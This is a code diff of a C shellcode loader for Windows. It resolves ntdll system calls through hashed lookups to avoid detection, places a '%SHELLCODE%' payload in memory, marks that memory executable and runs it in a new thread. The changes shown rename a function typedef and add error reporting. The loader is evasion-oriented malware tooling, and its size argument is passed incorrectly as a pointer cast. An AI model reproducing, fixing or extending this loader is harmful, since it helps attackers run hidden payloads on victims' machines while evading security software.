@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <winternl.h>
 #include <stdio.h>
 
 #define TRUE 1
@@ -43,7 +44,7 @@ typedef NTSYSAPI NTSTATUS(NTAPI* NtCreateThreadEx)(
     PVOID AttributeList
 );
 
-typedef NTSYSAPI NTSTATUS(NTAPI* NtWaitForSingleObject)(
+typedef NTSYSAPI NTSTATUS(NTAPI* NtWaitForSingleObj)(
     HANDLE Handle,
     BOOLEAN Alertable,
     PLARGE_INTEGER Timeout
@@ -171,7 +172,7 @@ void main() {
     // printf("country: %s\n", country);
     
     unsigned char payload[] = "%SHELLCODE%";
-    void* exec;
+    void* exec = NULL;
     DWORD old_protect;
     BOOL rv;
     HANDLE th;
@@ -189,7 +190,7 @@ void main() {
     NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, write_memory_hash);
     NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, virtual_protect_hash);
     NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, create_thread_hash);
-    NtWaitForSingleObject _NtWaitForSingleObject = (NtWaitForSingleObject)CustomGetProcAdress(hNtdll, wait_for_single_object_hash);
+    NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, wait_for_single_object_hash);
 
     
     // Allocating executable memory
@@ -208,12 +209,15 @@ void main() {
     // Changing memory protection to PAGE_EXECUTE_READ
     // VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
     // NOT WORKING
-    _NtProtectVirtMem((HANDLE)-1, &exec, (PSIZE_T)sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
+    if (_NtProtectVirtMem((HANDLE)-1, &exec, (PSIZE_T)sizeof(payload), PAGE_EXECUTE_READ, &old_protect) != 0) {
+        DWORD errCode = RtlNtStatusToDosError(GetLastError());
+        printf("Error in VirtualProtect to PAGE_EXECUTE_READ: %lu\n", errCode);
+    }
 
     // Executing shellcode in a new thread
     _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
 
     // Waiting for thread to finish
-    _NtWaitForSingleObject(th, FALSE, NULL);
+    _NtWaitForSingleObj(th, FALSE, NULL);
 }
 
